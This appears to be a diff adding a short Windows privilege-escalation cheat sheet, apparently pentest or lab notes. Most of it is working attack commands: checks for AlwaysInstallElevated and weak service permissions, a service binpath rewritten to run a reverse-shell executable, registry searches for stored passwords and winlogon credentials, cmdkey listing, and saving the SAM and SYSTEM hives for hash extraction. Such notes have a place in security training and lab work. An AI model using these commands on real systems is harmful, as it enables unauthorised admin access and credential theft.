@@ -1,0 +1,43 @@
+{permissions}
+
+*check
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\temp\permissions.txt
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" >> c:\temp\permissions.txt
+
+
+The first command uses wmic to list the services, 
+looks for the full path of the executable, 
+filters out system32 paths, 
+and then dumps that output to a text file. 
+
+The second command parses that text file getting rid of 
+some junk in the path name then does the icacls command on 
+that path to determine the permissions on that service executable.
+
+
+
+*leave it to the hacker to find a weak service permissions
+
+{edit weak service}
+
+sc config service binpath= "\"C:\PrivEsc\reverse.exe\""
+net start service
+
+
+
+{registry autorun}
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+*overwrite an exe if able to
+
+{look for creds}
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+cmdkey /list
+
+{sam & sys need admin}
+reg save HKLM\SAM C:\sam
+reg save HKLM\SYSTEM C:\system
